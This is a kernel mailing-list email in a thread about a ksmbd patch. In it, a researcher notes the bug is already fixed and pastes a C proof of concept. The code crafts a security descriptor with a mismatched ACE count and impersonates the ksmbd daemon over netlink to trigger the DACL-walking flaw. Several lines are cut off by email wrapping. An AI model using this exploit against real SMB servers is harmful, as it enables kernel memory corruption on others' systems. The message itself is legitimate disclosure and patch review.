Received: from mail-pf1-f170.google.com (mail-pf1-f170.google.com [209.85.210.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 03C39346E67
	for <linux-cifs@vger.kernel.org>; Sat, 25 Jul 2026 20:57:24 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.210.170
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785013047; cv=pass; b=ZJP7IFPaPFRqye2/pZ86x4eRR4uLt3dfaff9dI4BDlDhYGzCrFszUfm0+WDChT8zbrQsFU/PlevcrA/66e4hkDLUpiELVz2YguVY3wlXAd6EC4dJ+7/HlGTL/JUWVis14X1pcnQos7cIvpccd8G71PoU47AbSfZtrNLz91vqzp8=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785013047; c=relaxed/simple;
	bh=dhtomnmgRXNRW8pY9jDyus/nko7F/7Zsh12Z4i3/ySc=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=R2bkpCcNp06lgiTc+Krm87WrtPRI43RJDQDiuBAtAN3GzGue0nj5SMz1VPU0Kh48xOPABcb+Vf2oL7EMYn3kWA+hSYzOOipZmJXklDKmZCmzRWD0Hg0NSXZWTPuVyk1L/EEp6vD9yqIlSUPD8SJVj8jBEVzs1ucpCAenwY4yIIE=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=Jdj7xOKE; arc=pass smtp.client-ip=209.85.210.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="Jdj7xOKE"
Received: by mail-pf1-f170.google.com with SMTP id d2e1a72fcca58-84e0688b859so836433b3a.0
        for <linux-cifs@vger.kernel.org>; Sat, 25 Jul 2026 13:57:24 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1785013044; cv=none;
        d=google.com; s=arc-20260327;
        b=b3bZc0VgQdaXvCLGkGKcgN+uAaLr3SH4y5pe2hHfjsMZosaiUGvTdvA+KZBu23gBiF
         +V7Tc37Mw4SzIyVldCADwJPArT6rS9oJHVmseQkkWsbzW+vQ5O3UVoGICEgkbtL9ORsd
         OSJDpgfkyl2EjftP+mwolydVxRCghhPVVShlv0FR87xU9ASS3+aaNZFWJubYrgAFknno
         BSGnlgTbWq9mlLoXNoOpZ7uX95X+/i3vFAYhDD5X1iBGUgb/IK/E/0axurtLtMx58Gwu
         QdwM8S6arAyX0oNNFTfjFfTwzq15PSyjpp/BVxLeUfn5UrXXZdBZz+l931p9EpEomuul
         0u2w==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=9jw3fwaFXyRagc3M0aQTjS4p58qo+k3LxWUzfXHZnto=;
        fh=2e1qWWZEAtNzYRKkkOM3CIg93GGwy2hXYz6hfnIN+OI=;
        b=UocWrmchXILuuFF/pe2VIdbrBrEMTMMIHtUWZv7sfYK+KcILN4jxkaZug5kVCJZwB1
         sqOd3B/RGQj79EXkLNIZ9PMxdxYavMbiBguczvow1omk43V9Q3qQ1Rq6zvG7HuM/iaQj
         RYJ4/IcJY742DWpBrA/TGwrQUW0SlQa2FmOKJ5mvzWxiymZ38haPhxIqfjlWKKvI78/8
         hA4jvcUyvPBUNz7Zmkt0rDtUV37oW/6B1/FjgDwoTanbkpYKaPQfdUGBprvTH5kIIyQO
         KAuXDRYxtsFs0IIWRjl/tzzsl8k5HovIDQQ+7eM/A1xtshvLKuPNqloJ3quJ6PJIRnmY
         jkDQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1785013044; x=1785617844; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=9jw3fwaFXyRagc3M0aQTjS4p58qo+k3LxWUzfXHZnto=;
        b=Jdj7xOKE9jLuU4L4EXHSRWNIfnOqc1O27Vw+Gv3Ra+zgy/+B342bB8mBCo6TiEwV8E
         qpxiK0uo2kiFr1J3Trez8Gf3zL/fB4S9HISmYkJrv6GdBvp8ajJyECQJ7FgJxUoaRm3Q
         WT7Eu3KNtyJOAYMC9gvzm6SXwNn6lK2l65OHKyBmtRNkRn8haLllaKjMRpF766B7GLWJ
         KSKQjzgApnOkf1VtlO64Z8+YcBKhRTvyr0aurErAlZTnhCwD/nJYMNPuE9yQeY3b5Ixt
         CfNIpt215DlSlcuacetQx2c4rvNkzAnIfEOM+BRdE5Ij6qRunbJGNzgSEIQtFSWGB014
         5DIg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785013044; x=1785617844;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=9jw3fwaFXyRagc3M0aQTjS4p58qo+k3LxWUzfXHZnto=;
        b=Aup/prVKhXlKQSTmSU5FnMvjVUV0LONHtz5lyOdH5lG8+a6Hm69guFoBTfaK2xrjVE
         hriz1Dsj2wsxV5YupB9zmdMqNDRSrhxTyNKwyTYBNOnqzlB9/HiOTqpQsMNTSMkqTfN7
         CdOAe2IJCrMpN4aICyzdSSN5A5/Y+XwHVAv/qVxTB3SFyQoVnGD8Oj9Tacs0M8nDXk3a
         LqNnHa2aPc8IcvYoF4mKwHufYhH2/Rzc7rXu1VAOR8G85itWNR1pYROhhaonP+437DIu
         KJy1DwrhaoTPbjEVg8i4f+rpq/KeAnuDJ27sAEm3rlmaXzgANT/AnhpmnLGKAQNLxo32
         VkWg==
X-Forwarded-Encrypted: i=1; AHgh+RqIxHSAJM6cPOdDVZvipIlqmHH5pZTf0se/bCsqyy5bOgFKMNM7nlKQgN/NhR8usHKfLijkLx3CwATP@vger.kernel.org
X-Gm-Message-State: AOJu0Yw2MptU2Jb2wbQfj1UzUMKKjXjdNkyeoM0Ii9HLeIixPEYkmlvm
	piRDyaxWJRk0V53Ji2kW/KjX1USv5+G7paY2hrk9Hq97lVTxcA5WFe0x6IXrG+BZZSrSOjIlN7n
	YN854YBJOZOU58hoWcITS318QgjUMndKadJbGfOV6
X-Gm-Gg: AR+sD11MXkKnClOQk9j1w1oZC+hd/m6IhaZwH+XRiz8Tt3aYRZBXsRNavSGNEJPHcV6
	8bDVvgfu2E8R/trVw1UP4no32MQKOhcNvq1cupSPzaPdYuNyuDSygupn8aDVStMv58BxKiGQiK6
	kC5bCwetMz5rHFZME3ry0lYm2F78y959rqBW3yb3dPcJMn4mZevP2pdkWTBlalnbKKfYi2VUWsM
	Qcz7OA5n/jPVjlMGPaH+B7OVgkRQxQHFCNVY80O0HHcdWud5zGvbl4klXF7KmHmWHvwRZUd1k9l
	EU2DemnjJxVsH4+6yg==
X-Received: by 2002:a05:6a00:6c93:b0:848:6b76:592f with SMTP id
 d2e1a72fcca58-84e594016cfmr2856010b3a.5.1785013044138; Sat, 25 Jul 2026
 13:57:24 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260722235908.3564560-1-xmei5@asu.edu> <CAKYAXd_iJjEWhFQ7tJSDVaK66Lo8TOazAG+798ty5JUPj+bBDg@mail.gmail.com>
 <f855bffe-c601-43a7-941d-72ee7a7f852a@chenxiaosong.com>
In-Reply-To: <f855bffe-c601-43a7-941d-72ee7a7f852a@chenxiaosong.com>
From: Xiang Mei <xmei5@asu.edu>
Date: Sat, 25 Jul 2026 13:57:13 -0700
X-Gm-Features: AUfX_mxj9J2qCfHa3ZCzvvutRCB4crDwl4W-val-xHVplY8J-1Hi3HOz8mf6dVE
Message-ID: <CAPpSM+TbugewAeEPb1qGyDGgHpqTYBXt4hkL30i-opsF2w7tFQ@mail.gmail.com>
Subject: Re: [PATCH] ksmbd: use copied ACE count when walking DACL in set_ntacl_dacl
To: ChenXiaoSong <chenxiaosong@chenxiaosong.com>
Cc: Namjae Jeon <linkinjeon@kernel.org>, Steve French <smfrench@gmail.com>, 
	Sergey Senozhatsky <senozhatsky@chromium.org>, Tom Talpey <tom@talpey.com>, linux-cifs@vger.kernel.org, 
	linux-kernel@vger.kernel.org, Hyunchul Lee <hyc.lee@gmail.com>, 
	Ronnie Sahlberg <lsahlber@redhat.com>, AutonomousCodeSecurity@microsoft.com, 
	tgopinath@linux.microsoft.com, kys@microsoft.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Fri, Jul 24, 2026 at 12:10=E2=80=AFAM ChenXiaoSong
<chenxiaosong@chenxiaosong.com> wrote:
>
> Could you share the steps to reproduce it?
>
> On 7/23/26 08:19, Namjae Jeon wrote:
> > Thanks for the patch.
> > Could you please check whether this issue is still present in the
> > current ksmbd-for-next-next tree?
>
The issue is patched in 065148205b48. Sorry for the dup.

If you are still interested in the poc, here is the poc we triggered
the bug with:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <stdint.h>
#include <pthread.h>

/* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D SHA-256 implementation =3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D */
static const uint32_t sha256_k[64] =3D {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923=
f82,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bd=
c06,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb=
0a9,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06c=
a63,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c=
2c9,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40=
e35,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9=
cca,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef=
9a32
};
#define RR(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z) (((x)&(y))^((~(x))&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define EP0(x) (RR(x,2)^RR(x,13)^RR(x,22))
#define EP1(x) (RR(x,6)^RR(x,11)^RR(x,25))
#define SIG0(x) (RR(x,7)^RR(x,18)^((x)>>3))
#define SIG1(x) (RR(x,17)^RR(x,19)^((x)>>10))

static void sha256(const uint8_t *data, size_t len, uint8_t out[32]) {
    uint32_t h[8] =3D {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
                     0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
    size_t i, j;
    uint64_t bitlen =3D len * 8;
    size_t nblocks =3D len / 64;
    for (i =3D 0; i < nblocks; i++) {
        uint32_t w[64], a,b,c,d,e,f,g,hh,t1,t2;
        const uint8_t *blk =3D data + i * 64;
        for (j =3D 0; j < 16; j++)
            w[j] =3D ((uint32_t)blk[j*4]<<24)|((uint32_t)blk[j*4+1]<<16)|
                   ((uint32_t)blk[j*4+2]<<8)|blk[j*4+3];
        for (j =3D 16; j < 64; j++)
            w[j] =3D SIG1(w[j-2]) + w[j-7] + SIG0(w[j-15]) + w[j-16];
        a=3Dh[0];b=3Dh[1];c=3Dh[2];d=3Dh[3];e=3Dh[4];f=3Dh[5];g=3Dh[6];hh=
=3Dh[7];
        for (j =3D 0; j < 64; j++) {
            t1 =3D hh + EP1(e) + CH(e,f,g) + sha256_k[j] + w[j];
            t2 =3D EP0(a) + MAJ(a,b,c);
            hh=3Dg;g=3Df;f=3De;e=3Dd+t1;d=3Dc;c=3Db;b=3Da;a=3Dt1+t2;
        }
        h[0]+=3Da;h[1]+=3Db;h[2]+=3Dc;h[3]+=3Dd;h[4]+=3De;h[5]+=3Df;h[6]+=
=3Dg;h[7]+=3Dhh;
    }
    uint8_t last[128];
    size_t rem =3D len - nblocks * 64;
    memset(last, 0, sizeof(last));
    if (rem) memcpy(last, data + nblocks * 64, rem);
    last[rem] =3D 0x80;
    int final_blocks =3D (rem < 56) ? 1 : 2;
    int pad_off =3D final_blocks * 64 - 8;
    for (j =3D 0; j < 8; j++) last[pad_off + j] =3D (bitlen >> (56 - j*8)) =
& 0xff;
    for (int bi =3D 0; bi < final_blocks; bi++) {
        uint32_t w[64], a,b,c,d,e,f,g,hh,t1,t2;
        uint8_t *blk =3D last + bi * 64;
        for (j =3D 0; j < 16; j++)
            w[j] =3D ((uint32_t)blk[j*4]<<24)|((uint32_t)blk[j*4+1]<<16)|
                   ((uint32_t)blk[j*4+2]<<8)|blk[j*4+3];
        for (j =3D 16; j < 64; j++)
            w[j] =3D SIG1(w[j-2]) + w[j-7] + SIG0(w[j-15]) + w[j-16];
        a=3Dh[0];b=3Dh[1];c=3Dh[2];d=3Dh[3];e=3Dh[4];f=3Dh[5];g=3Dh[6];hh=
=3Dh[7];
        for (j =3D 0; j < 64; j++) {
            t1 =3D hh + EP1(e) + CH(e,f,g) + sha256_k[j] + w[j];
            t2 =3D EP0(a) + MAJ(a,b,c);
            hh=3Dg;g=3Df;f=3De;e=3Dd+t1;d=3Dc;c=3Db;b=3Da;a=3Dt1+t2;
        }
        h[0]+=3Da;h[1]+=3Db;h[2]+=3Dc;h[3]+=3Dd;h[4]+=3De;h[5]+=3Df;h[6]+=
=3Dg;h[7]+=3Dhh;
    }
    for (j =3D 0; j < 8; j++) {
        out[j*4] =3D (h[j]>>24)&0xff; out[j*4+1] =3D (h[j]>>16)&0xff;
        out[j*4+2] =3D (h[j]>>8)&0xff; out[j*4+3] =3D h[j]&0xff;
    }
}

/* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D NDR encoder =3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D */
struct ndr_buf { uint8_t *data; int offset; int capacity; };

static void ndr_ensure(struct ndr_buf *n, int need) {
    if (n->offset + need > n->capacity) {
        n->capacity =3D (n->offset + need) * 2;
        n->data =3D realloc(n->data, n->capacity);
    }
}
static void ndr_write_int16(struct ndr_buf *n, uint16_t v) {
    ndr_ensure(n, 2); memcpy(n->data + n->offset, &v, 2); n->offset +=3D 2;
}
static void ndr_write_int32(struct ndr_buf *n, uint32_t v) {
    ndr_ensure(n, 4); memcpy(n->data + n->offset, &v, 4); n->offset +=3D 4;
}
static void ndr_write_int64(struct ndr_buf *n, uint64_t v) {
    ndr_ensure(n, 8); memcpy(n->data + n->offset, &v, 8); n->offset +=3D 8;
}
static void ndr_write_bytes(struct ndr_buf *n, const void *d, int len) {
    ndr_ensure(n, len); memcpy(n->data + n->offset, d, len); n->offset +=3D=
 len;
}
static void ndr_align8(struct ndr_buf *n) {
    int a =3D (n->offset + 7) & ~7;
    if (a > n->offset) { ndr_ensure(n, a - n->offset); memset(n->data + n->=
off}
}

#define SMB_ACL_USER      1
#define SMB_ACL_USER_OBJ  2
#define SMB_ACL_GROUP     3
#define SMB_ACL_GROUP_OBJ 4
#define SMB_ACL_OTHER     5
#define SMB_ACL_MASK      6

struct acl_entry { int type; uint64_t id; int perm; };

static void ndr_encode_posix_acl_entry_fn(struct ndr_buf *n, struct acl_ent=
ry {
    ndr_write_int32(n, count);
    ndr_align8(n);
    ndr_write_int32(n, count);
    ndr_write_int32(n, 0);
    for (int i =3D 0; i < count; i++) {
        ndr_align8(n);
        ndr_write_int16(n, entries[i].type);
        ndr_write_int16(n, entries[i].type);
        if (entries[i].type =3D=3D SMB_ACL_USER) {
            ndr_align8(n);
            ndr_write_int64(n, entries[i].id);
        } else if (entries[i].type =3D=3D SMB_ACL_GROUP) {
            ndr_align8(n);
            ndr_write_int64(n, entries[i].id);
        }
        ndr_write_int32(n, entries[i].perm);
    }
}

static void ndr_encode_posix_acl_fn(struct ndr_buf *n, uint64_t uid, uint64=
_t ,
                                     uint32_t mode, struct acl_entry *acl, =
int{
    uint32_t ref_id =3D 0x00020000;
    n->offset =3D 0;
    if (acl) { ndr_write_int32(n, ref_id); ref_id +=3D 4; }
    else ndr_write_int32(n, 0);
    /* no default ACL */
    ndr_write_int32(n, 0);
    ndr_write_int64(n, uid);
    ndr_write_int64(n, gid);
    ndr_write_int32(n, mode);
    if (acl)
        ndr_encode_posix_acl_entry_fn(n, acl, acl_count);
}

#define NDR_NTSD_OFFSETOF 0xA0

static void ndr_encode_v4_ntacl_fn(struct ndr_buf *n, uint8_t hash[64],
                                    uint8_t posix_hash[64], uint8_t *sd_buf=
, i{
    n->offset =3D 0;
    ndr_write_int16(n, 4);          /* version */
    ndr_write_int32(n, 4);          /* version2 */
    ndr_write_int16(n, 2);          /* level */
    ndr_write_int32(n, 0x00020004); /* ref_id */
    ndr_write_int16(n, 1);          /* hash_type =3D SHA256 */
    ndr_write_bytes(n, hash, 64);
    uint8_t desc[10]; memset(desc, 0, 10); memcpy(desc, "posix_acl", 9);
    ndr_write_bytes(n, desc, 10);
    ndr_write_int64(n, 0);          /* current_time */
    ndr_write_bytes(n, posix_hash, 64);
    ndr_write_bytes(n, sd_buf, sd_size);
}

/* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D Build crafted Security Descriptor =
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
static int build_crafted_sd(uint8_t *out, int maxl) {
    memset(out, 0, maxl);
    int off =3D 0;
    /* NTSD header: revision=3D1, type=3DDACL_PRESENT(0x0004) */
    *(uint16_t *)(out + 0) =3D 1;
    *(uint16_t *)(out + 2) =3D 0x0004;
    off =3D 20; /* 2+2+4+4+4+4 =3D 20 */

    int dacl_off =3D off;
    *(uint16_t*)(out+off) =3D 2;
    *(uint16_t*)(out+off+4) =3D 2; /* num_aces =3D 2, only 1 gets copied */
    off +=3D 8;

    /* ACE1: Everyone (S-1-1-0) FULL_CONTROL - passes the CREATE access che=
ck /
    out[off]=3D0; *(uint32_t*)(out+off+4)=3D0x001F01FF;
    out[off+8]=3D1; out[off+9]=3D1;
    out[off+14]=3D0; out[off+15]=3D1;
    *(uint32_t*)(out+off+16)=3D0;
    int ace1_sz =3D 8+8+1*4;
    *(uint16_t*)(out+off+2)=3Dace1_sz; off+=3Dace1_sz;

    /* ACE2: num_subauth=3D20 > 15, skipped by the copy loop but still coun=
ted */
    out[off]=3D0; *(uint32_t*)(out+off+4)=3D0x001F01FF;
    out[off+8]=3D1; out[off+9]=3D20; out[off+15]=3D5;
    int ace_sz =3D 8+8;
    *(uint16_t*)(out+off+2)=3Dace_sz; off+=3Dace_sz;

    *(uint16_t*)(out+dacl_off+2) =3D off - dacl_off;
    *(uint32_t*)(out+16) =3D dacl_off;
    return off;
}

/* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D ksmbd netlink IPC =3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D */
#define KSMBD_GENL_NAME     "SMBD_GENL"
#define KSMBD_GENL_VERSION  0x01

enum ksmbd_event {
    KSMBD_EVENT_UNSPEC=3D0, KSMBD_EVENT_HEARTBEAT_REQUEST,
    KSMBD_EVENT_STARTING_UP, KSMBD_EVENT_SHUTTING_DOWN,
    KSMBD_EVENT_LOGIN_REQUEST, KSMBD_EVENT_LOGIN_RESPONSE,
    KSMBD_EVENT_SHARE_CONFIG_REQUEST, KSMBD_EVENT_SHARE_CONFIG_RESPONSE,
    KSMBD_EVENT_TREE_CONNECT_REQUEST, KSMBD_EVENT_TREE_CONNECT_RESPONSE,
    KSMBD_EVENT_TREE_DISCONNECT_REQUEST, KSMBD_EVENT_LOGOUT_REQUEST,
    KSMBD_EVENT_RPC_REQUEST, KSMBD_EVENT_RPC_RESPONSE,
    KSMBD_EVENT_SPNEGO_AUTHEN_REQUEST, KSMBD_EVENT_SPNEGO_AUTHEN_RESPONSE,
    KSMBD_EVENT_LOGIN_REQUEST_EXT, KSMBD_EVENT_LOGIN_RESPONSE_EXT,
};

#define KSMBD_SHARE_FLAG_AVAILABLE    (1<<0)
#define KSMBD_SHARE_FLAG_BROWSEABLE   (1<<1)
#define KSMBD_SHARE_FLAG_WRITEABLE    (1<<2)
#define KSMBD_SHARE_FLAG_GUEST_OK     (1<<4)
#define KSMBD_SHARE_FLAG_GUEST_ONLY   (1<<5)
#define KSMBD_SHARE_FLAG_OPLOCKS      (1<<7)
#define KSMBD_SHARE_FLAG_ACL_XATTR    (1<<13)
#define KSMBD_USER_FLAG_OK            (1<<0)
#define KSMBD_USER_FLAG_GUEST_ACCOUNT (1<<4)
#define KSMBD_TREE_CONN_STATUS_OK     0
#define KSMBD_TREE_CONN_FLAG_WRITABLE (1<<2)

struct ksmbd_startup_request {
    uint32_t flags; int32_t signing;
    int8_t min_prot[16]; int8_t max_prot[16];
    int8_t netbios_name[16]; int8_t work_group[64]; int8_t server_string[64=
];
    uint16_t tcp_port; uint16_t ipc_timeout;
    uint32_t deadtime; uint32_t file_max;
    uint32_t smb2_max_write; uint32_t smb2_max_read; uint32_t smb2_max_tran=
s;
    uint32_t share_fake_fscaps; uint32_t sub_auth[3];
    uint32_t smb2_max_credits; uint32_t smbd_max_io_size;
    uint32_t max_connections; int8_t bind_interfaces_only;
    uint32_t max_ip_connections; int8_t reserved[499]; uint32_t ifc_list_sz=
;
} __attribute__((packed));

struct ksmbd_login_request { uint32_t handle; int8_t account[48]; uint32_t =
res;
struct ksmbd_login_response {
    uint32_t handle; uint32_t gid; uint32_t uid; int8_t account[48];
    uint16_t status; uint16_t hash_sz; int8_t hash[18]; uint32_t reserved[1=
6];
};
struct ksmbd_login_response_ext { uint32_t handle; int32_t ngroups; int8_t =
res;
struct ksmbd_share_config_response {
    uint32_t handle; uint32_t flags; uint16_t create_mask; uint16_t directo=
ry_;
    uint16_t force_create_mode; uint16_t force_directory_mode;
    uint16_t force_uid; uint16_t force_gid; int8_t share_name[64];
    uint32_t reserved[111]; uint32_t payload_sz; uint32_t veto_list_sz;
};
struct ksmbd_tree_connect_response {
    uint32_t handle; uint16_t status; uint16_t connection_flags; uint32_t r=
ese;
};

static const char *SHARE_PATH =3D "/tmp/smbshare";
static int nl_sock =3D -1;
static uint16_t nl_family_id =3D 0;
static uint32_t nl_mcast_grp =3D 0;
static volatile int daemon_running =3D 1;

static int resolve_genl_family(int sock, const char *name) {
    char buf[4096]; memset(buf, 0, sizeof(buf));
    struct nlmsghdr *nlh =3D (void *)buf;
    struct genlmsghdr *gh =3D (void *)NLMSG_DATA(nlh);
    struct nlattr *nla =3D (void *)((char *)gh + GENL_HDRLEN);
    int nlen =3D strlen(name) + 1;
    nla->nla_len =3D NLA_HDRLEN + nlen; nla->nla_type =3D CTRL_ATTR_FAMILY_=
NAME;
    memcpy((char *)nla + NLA_HDRLEN, name, nlen);
    gh->cmd =3D CTRL_CMD_GETFAMILY; gh->version =3D 1;
    nlh->nlmsg_len =3D NLMSG_LENGTH(GENL_HDRLEN) + NLA_ALIGN(nla->nla_len);
    nlh->nlmsg_type =3D GENL_ID_CTRL; nlh->nlmsg_flags =3D NLM_F_REQUEST; n=
lh->nlm;
    struct sockaddr_nl a =3D {.nl_family =3D AF_NETLINK};
    if (sendto(sock, buf, nlh->nlmsg_len, 0, (void *)&a, sizeof(a)) < 0) re=
tur;
    int len =3D recv(sock, buf, sizeof(buf), 0);
    if (len < 0) return -1;
    nlh =3D (void *)buf;
    if (nlh->nlmsg_type =3D=3D NLMSG_ERROR) return -1;
    int fid =3D -1;
    int rem =3D NLMSG_PAYLOAD(nlh, GENL_HDRLEN);
    char *p =3D (char *)NLMSG_DATA(nlh) + GENL_HDRLEN;
    while (rem >=3D (int)NLA_HDRLEN) {
        struct nlattr *at =3D (void *)p;
        if (at->nla_len < NLA_HDRLEN) break;
        int alen =3D NLA_ALIGN(at->nla_len);
        if (at->nla_type =3D=3D CTRL_ATTR_FAMILY_ID) fid =3D *(uint16_t *)(=
(char *)a;
        if (at->nla_type =3D=3D CTRL_ATTR_MCAST_GROUPS) {
            int grem =3D at->nla_len - NLA_HDRLEN; char *gp =3D (char *)at =
+ NLA_H;
            while (grem >=3D (int)NLA_HDRLEN) {
                struct nlattr *grp =3D (void *)gp;
                if (grp->nla_len < NLA_HDRLEN) break;
                int irem =3D grp->nla_len - NLA_HDRLEN; char *ip =3D (char =
*)grp +;
                while (irem >=3D (int)NLA_HDRLEN) {
                    struct nlattr *ia =3D (void *)ip;
                    if (ia->nla_len < NLA_HDRLEN) break;
                    if (ia->nla_type =3D=3D 2) nl_mcast_grp =3D *(uint32_t =
*)((char ;
                    int il =3D NLA_ALIGN(ia->nla_len); ip +=3D il; irem -=
=3D il;
                }
                int gl =3D NLA_ALIGN(grp->nla_len); gp +=3D gl; grem -=3D g=
l;
            }
        }
        p +=3D alen; rem -=3D alen;
    }
    return fid;
}

static int nl_send(int sock, uint16_t fid, uint8_t cmd, uint16_t atype, voi=
d *{
    char buf[8192]; memset(buf, 0, sizeof(buf));
    struct nlmsghdr *nlh =3D (void *)buf;
    struct genlmsghdr *gh =3D (void *)NLMSG_DATA(nlh);
    gh->cmd =3D cmd; gh->version =3D KSMBD_GENL_VERSION;
    struct nlattr *nla =3D (void *)((char *)gh + GENL_HDRLEN);
    nla->nla_type =3D atype; nla->nla_len =3D NLA_HDRLEN + dlen;
    memcpy((char *)nla + NLA_HDRLEN, data, dlen);
    nlh->nlmsg_len =3D NLMSG_LENGTH(GENL_HDRLEN) + NLA_ALIGN(nla->nla_len);
    nlh->nlmsg_type =3D fid; nlh->nlmsg_flags =3D NLM_F_REQUEST;
    struct sockaddr_nl a =3D {.nl_family =3D AF_NETLINK};
    return sendto(sock, buf, nlh->nlmsg_len, 0, (void *)&a, sizeof(a));
}

static void *ipc_thread(void *arg) {
    (void)arg;
    char buf[8192];
    while (daemon_running) {
        struct sockaddr_nl a; socklen_t al =3D sizeof(a);
        int len =3D recvfrom(nl_sock, buf, sizeof(buf), 0, (void *)&a, &al)=
;
        if (len < 0) { if (errno =3D=3D EINTR) continue; break; }
        struct nlmsghdr *nlh =3D (void *)buf;
        if (nlh->nlmsg_type !=3D nl_family_id) continue;
        struct genlmsghdr *gh =3D (void *)NLMSG_DATA(nlh);
        void *payload =3D NULL;
        int rem =3D NLMSG_PAYLOAD(nlh, GENL_HDRLEN);
        char *ap =3D (char *)gh + GENL_HDRLEN;
        while (rem >=3D (int)NLA_HDRLEN) {
            struct nlattr *na =3D (void *)ap;
            if (na->nla_len < NLA_HDRLEN) break;
            if (na->nla_type =3D=3D gh->cmd) { payload =3D ap + NLA_HDRLEN;=
 break; }
            int al2 =3D NLA_ALIGN(na->nla_len); ap +=3D al2; rem -=3D al2;
        }
        if (!payload) {
            ap =3D (char *)gh + GENL_HDRLEN; rem =3D NLMSG_PAYLOAD(nlh, GEN=
L_HDRLE;
            if (rem >=3D (int)NLA_HDRLEN) {
                struct nlattr *na =3D (void *)ap;
                if (na->nla_len >=3D NLA_HDRLEN) payload =3D ap + NLA_HDRLE=
N;
            }
        }
        switch (gh->cmd) {
        case KSMBD_EVENT_LOGIN_REQUEST: {
            struct ksmbd_login_response r; memset(&r, 0, sizeof(r));
            if (payload) { r.handle =3D *(uint32_t*)payload; memcpy(r.accou=
nt, (}
            r.status =3D KSMBD_USER_FLAG_OK | KSMBD_USER_FLAG_GUEST_ACCOUNT=
;
            r.uid =3D 0; r.gid =3D 0;
            nl_send(nl_sock, nl_family_id, KSMBD_EVENT_LOGIN_RESPONSE, KSMB=
D_E;
            break;
        }
        case KSMBD_EVENT_LOGIN_REQUEST_EXT: {
            struct ksmbd_login_response_ext r; memset(&r, 0, sizeof(r));
            if (payload) r.handle =3D *(uint32_t*)payload;
            nl_send(nl_sock, nl_family_id, KSMBD_EVENT_LOGIN_RESPONSE_EXT, =
KSM;
            break;
        }
        case KSMBD_EVENT_SHARE_CONFIG_REQUEST: {
            char rb[sizeof(struct ksmbd_share_config_response) + 256]; mems=
et(;
            struct ksmbd_share_config_response *r =3D (void *)rb;
            if (payload) r->handle =3D *(uint32_t*)payload;
            r->flags =3D KSMBD_SHARE_FLAG_AVAILABLE | KSMBD_SHARE_FLAG_BROW=
SEABL|
